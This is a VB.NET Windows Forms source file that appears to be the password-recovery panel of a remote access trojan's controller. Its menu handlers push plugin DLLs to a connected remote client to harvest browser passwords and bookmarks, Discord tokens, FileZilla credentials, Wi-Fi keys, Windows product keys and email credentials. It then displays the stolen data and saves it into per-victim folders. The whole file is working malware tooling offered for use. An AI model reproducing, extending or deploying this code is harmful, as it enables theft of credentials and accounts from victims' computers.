Imports System.IO

Public Class PassR
    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem2.Click
        If (Me.T1.Find(Me.TFind.Text, (Me.T1.SelectionStart + Me.T1.SelectionLength), RichTextBoxFinds.None) = -1) Then
            Me.T1.Find(Me.TFind.Text, 0, RichTextBoxFinds.None)
        End If
    End Sub
    Public C As Client
    Public CID As String
    Private Sub PassR_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub



    Private Sub BrowsersToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BrowsersToolStripMenuItem.Click
        Dim B As Byte()
        Try
            T1.Clear()

            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = "Chromium..."

            B = SB("PC#" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Chromium.dll")))

        Catch ex As Exception
            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = ".."
            MessageBox.Show(ex.Message)
            Return
        End Try


        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        Me.T1.Copy()
    End Sub

    Private Sub SelectAllToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SelectAllToolStripMenuItem.Click
        Me.T1.SelectAll()
    End Sub

    Private Sub BookmarksToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BookmarksToolStripMenuItem.Click
        Dim B As Byte()
        Try
            T1.Clear()
            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = "Bookmarks..."
            B = SB("PC#" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Bookmarks.dll")))
        Catch ex As Exception
            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = ".."
            MessageBox.Show(ex.Message)
            Return
        End Try


        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)
    End Sub

    Private Sub DicordTokensToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DicordTokensToolStripMenuItem.Click
        Dim B As Byte()
        Try
            T1.Clear()
            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = "DicordTokens..."
            B = SB("PC#" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\DicordTokens.dll")))

        Catch ex As Exception
            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = ".."
            MessageBox.Show(ex.Message)
            Return
        End Try


        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

    End Sub

    Private Sub FileZillaToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FileZillaToolStripMenuItem.Click
        Dim B As Byte()
        Try
            T1.Clear()
            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = "FileZilla..."
            B = SB("PC#" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\FileZilla.dll")))

        Catch ex As Exception
            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = ".."
            MessageBox.Show(ex.Message)
            Return
        End Try


        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Not C.IsConnected Then
                Me.Close()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub ProduKeyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ProduKeyToolStripMenuItem.Click
        Dim B As Byte()
        Try
            T1.Clear()
            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = "ProduKey..."
            B = SB("Pvbnet" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\ProduKey.dll")))

        Catch ex As Exception
            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = ".."
            MessageBox.Show(ex.Message)
            Return
        End Try


        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

    End Sub

    Private Sub WifiKeysToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles WifiKeysToolStripMenuItem.Click
        Dim B As Byte()
        Try
            T1.Clear()
            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = "WifiKeys..."
            B = SB("Pvbnet" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\WifiKeys.dll")))

        Catch ex As Exception
            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = ".."
            MessageBox.Show(ex.Message)
            Return
        End Try


        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

    End Sub

    Private Sub EmailToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EmailToolStripMenuItem.Click
        Dim B As Byte()
        Try
            T1.Clear()
            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = "Email..."
            B = SB("Email" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Email.dll")))

        Catch ex As Exception
            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = ".."
            MessageBox.Show(ex.Message)
            Return
        End Try


        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

    End Sub

    Private Sub SaveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveToolStripMenuItem.Click
        Try
            If T1.Text = Nothing Then
            Else
                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads") Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads")
                End If

                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & CID) Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & CID)
                End If

                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & CID & "\PasswordRecovery") Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & CID & "\PasswordRecovery")
                End If


                Dim objWriter As New System.IO.StreamWriter(Application.StartupPath & "\Downloads" & "\" & CID & "\PasswordRecovery" & "\" & DateAndTime.Now.ToString("yyMMddhhmmssfff") & ".txt", False)
                objWriter.WriteLine(T1.Text)
                objWriter.Close()
            End If
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub

    Private Sub T1_LinkClicked(sender As Object, e As LinkClickedEventArgs) Handles T1.LinkClicked
        Try
            Process.Start(e.LinkText)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub InternetExplorerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InternetExplorerToolStripMenuItem.Click
        Dim B As Byte()
        Try
            T1.Clear()

            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = "InternetExplorer..."

            B = SB("PC#" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\InternetExplorer.dll")))

        Catch ex As Exception
            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = ".."
            MessageBox.Show(ex.Message)
            Return
        End Try


        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

    End Sub

    Private Sub AllInOneToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AllInOneToolStripMenuItem.Click
        Dim B As Byte()
        Try
            T1.Clear()
            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = "All-In-One..."
            B = SB("Email" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\All-In-One.dll")))

        Catch ex As Exception
            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = ".."
            MessageBox.Show(ex.Message)
            Return
        End Try

        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

    End Sub
End Class